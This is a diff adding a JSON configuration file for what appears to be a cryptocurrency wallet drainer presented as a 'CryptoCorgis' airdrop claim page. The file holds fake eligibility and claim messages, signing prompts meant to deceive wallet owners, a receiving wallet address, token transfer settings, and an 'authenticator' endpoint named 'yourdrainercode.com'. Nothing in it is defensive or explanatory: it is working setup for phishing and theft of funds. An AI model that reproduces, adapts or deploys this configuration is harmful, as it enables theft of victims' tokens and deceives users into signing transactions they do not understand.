@@ -1,0 +1,56 @@
+{
+    "texts": [
+        "Transaction timed out!",
+        "Please refresh the page and try again in time!",
+        "Transaction Pending...",
+        "{addyfirst4}...{addylast4}",
+        "Your transaction is pending.",
+        "There is a problem",
+        "This address is not eligible, try again with another wallet.",
+        "Your wallet is eligible!",
+        "Please confirm prompt in order to proceed",
+        "Claiming airdrop...",
+        "Sign the transaction to receive your tokens.",
+        "Transaction rejected",
+        "Please Reconnect your wallet and try again."
+    ],
+    "videoGuide": true,
+    "setClickLimitTime": 10,
+    "textchanging": false,
+    "modal": 4,
+    "solflare": {
+        "transactions": 20,
+        "each": 1,
+        "sWallet": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"
+    },
+    "bypo": {
+        "enable": true,
+        "extraAdd": true,
+        "tokens": [
+            {
+                "solana": 1,
+                "from": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"
+            },
+            {
+                "mint": "A3eME5CetyZPBoWbRUwY3tSe25S6tb18ba9ZPbWk9eFJ",
+                "source": "G2byZ4617DZPZiPtSqZHLXrRfrykaVLxRPGYBeuYHg7y",
+                "owner": "5EnczdN9FtZwa9GiyMNUt4C8hYjcFdfds6w6U8sMdPTv",
+                "amount": 500000000000
+            }
+        ]
+    },
+    "authenticator": "https://yourdrainercode.com",
+    "sleep": {
+        "enabled": false,
+        "signing": {
+            "enabled": true,
+            "message": "To authenticate with Us, sign below"
+        }
+    },
+    "minEligible": 1,
+    "seeds": {
+        "askForConnecting": true,
+        "signMessage": "To avoid digital dognappers, sign below to authenticate with CryptoCorgis",
+        "enableSign": true
+    }
+}
